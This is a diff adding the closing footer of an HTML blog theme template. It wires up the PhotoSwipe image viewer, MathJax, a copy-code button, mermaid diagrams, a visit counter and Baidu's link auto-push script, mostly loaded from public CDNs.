+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
